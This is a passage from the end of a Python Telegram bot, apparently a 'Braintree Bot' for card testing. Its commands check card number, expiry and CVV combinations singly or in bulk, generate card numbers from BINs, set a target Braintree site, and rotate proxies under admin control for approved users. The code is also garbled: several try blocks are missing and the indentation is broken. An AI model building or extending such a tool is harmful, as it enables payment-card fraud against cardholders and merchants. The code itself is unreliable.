        
        edit_safe(message.chat.id, status_msg.message_id, gen_response)
    except Exception as e:
        print(f"gen error: {e}")
        send_safe(message.chat.id, "❌ Error generating cards")

@bot.message_handler(commands=['custom_site'])
@require_approval
def custom_site_command(message):
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
    send_safe(message.chat.id, "Usage:\n/custom_site https://yoursite.com")
    return
        
        site_url = command_parts[1].strip()
        
        if not site_url.startswith('http'):
    send_safe(message.chat.id, "❌ URL must start with http:// or https://")
    return
        
        user_custom_sites[message.chat.id] = site_url
        send_safe(message.chat.id, f"✅ Custom site set:\n{site_url}")
    except Exception as e:
        print(f"custom_site error: {e}")

@bot.message_handler(commands=['remove_site'])
@require_approval
def remove_site_command(message):
        if message.chat.id in user_custom_sites:
    del user_custom_sites[message.chat.id]
    send_safe(message.chat.id, "✅ Custom site removed")
        else:
    send_safe(message.chat.id, "ℹ️ Using default site")
    except Exception as e:
        print(f"remove_site error: {e}")

@bot.message_handler(commands=['site'])
@require_approval
def check_current_site(message):
    try:
        current_site = get_braintree_site(message.chat.id)
        is_custom = message.chat.id in user_custom_sites
        send_safe(message.chat.id, f"{'🔧 Custom' if is_custom else '📌 Default'} Site:\n{current_site}")
    except Exception as e:
        print(f"site error: {e}")

@bot.message_handler(commands=['proxy'])
def set_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
    send_safe(message.chat.id, "Usage:\n/proxy http://user:pass@host:port")
    return
        
        proxy_url = command_parts[1].strip()
        status_msg = send_safe(message.chat.id, "⏳ Testing proxy...")
        success, msg = set_proxy(proxy_url)
        edit_safe(message.chat.id, status_msg.message_id, msg)
    except Exception as e:
        print(f"proxy error: {e}")
        send_safe(message.chat.id, f"❌ Error: {str(e)[:50]}")

@bot.message_handler(commands=['removeproxy'])
def remove_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        send_safe(message.chat.id, remove_proxy())
    except Exception as e:
        print(f"removeproxy error: {e}")

@bot.message_handler(commands=['proxystatus'])
def proxy_status_command(message):
    if message.from_user.id != ADMIN_ID:
        return
        with PROXY_LOCK:
    if ACTIVE_PROXY:
    send_safe(message.chat.id, f"🟢 Active\n🌐 {ACTIVE_PROXY}")
    else:
    send_safe(message.chat.id, "🔴 Not set")
    except Exception as e:
        print(f"proxystatus error: {e}")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != ADMIN_ID:
        return
        if not approved_users:
    send_safe(message.chat.id, "📭 No approved users")
    return
        text = "👥 Approved Users:\n\n"
        for idx, uid in enumerate(approved_users, 1):
    text += f"{idx}. 🆔 {uid}\n"
        send_safe(message.chat.id, text)
    except Exception as e:
        print(f"users error: {e}")

@bot.message_handler(commands=['pending'])
def list_pending_command(message):
    if message.from_user.id != ADMIN_ID:
        return
        if not pending_requests:
    send_safe(message.chat.id, "📭 No pending requests")
    return
        text = "⏳ Pending Requests:\n\n"
        for user_id, info in pending_requests.items():
    text += f"👤 {info['name']}\n🔗 @{info['username']}\n🆔 {user_id}\n\n"
        send_safe(message.chat.id, text)
    except Exception as e:
        print(f"pending error: {e}")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
    send_safe(message.chat.id, "Usage:\n/broadcast Your message")
    return
        
        broadcast_text = command_parts[1].strip()
        
        if not approved_users:
    send_safe(message.chat.id, "❌ No approved users")
    return
        
        status_msg = send_safe(message.chat.id, "📤 Broadcasting...")
        success_count = failed_count = 0
        
        for user_id in approved_users:
    try:
    send_safe(user_id, f"📢 ADMIN BROADCAST\n\n{broadcast_text}")
    success_count += 1
    except:
    failed_count += 1
    time.sleep(0.3)
        
        edit_safe(message.chat.id, status_msg.message_id, f"✅ Done!\n\n✅ Sent: {success_count}\n❌ Failed: {failed_count}")
    except Exception as e:
        print(f"broadcast error: {e}")

@bot.message_handler(commands=['help'])
@require_approval
def send_help(message):
        help_text = "📚 <b>COMMANDS</b>\n\n"
        help_text += "💳 /bchk card|mm|yy|cvv\n"
        help_text += "📦 /bmass [cards]\n"
        help_text += " \n"
        help_text += "🔍 /bin 453212\n"
        help_text += "🎲 /gen 453212 5\n\n"
        help_text += "✨ Fast & Reliable!"
        send_safe(message.chat.id, help_text, parse_mode='HTML')
    except Exception as e:
        print(f"help error: {e}")

if __name__ == '__main__':
    print("🚀 Braintree Bot started!")
    print(f"⚡ Optimized for {MAX_WORKERS} parallel workers")
    print("✅ Enhanced error handling")
    print("🔥 Ready for multiple users!")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Bot error: {e}")
        time.sleep(5)
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
